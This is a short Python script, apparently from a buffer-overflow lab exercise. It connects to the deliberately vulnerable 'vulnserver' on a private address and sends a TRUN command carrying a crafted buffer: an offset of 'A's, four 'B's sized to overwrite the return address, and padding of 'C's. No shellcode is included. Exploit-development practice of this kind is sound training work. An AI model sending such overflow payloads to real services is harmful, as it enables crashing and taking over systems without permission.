#!/usr/bin/python

import os
import sys
import socket

host = '192.168.0.36'
port = 9999

buf = "A" * 2003 + "B" * 4 + "C" * 350

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

refused = s.connect_ex((host, port))

if refused:
    print("========Could not connect to vulnserver!========")
else:
    print("========Fuzzing in progress========")
    s.send("TRUN /.:/"+buf)
    print("========Fuzzed successfully!========")
    s.close()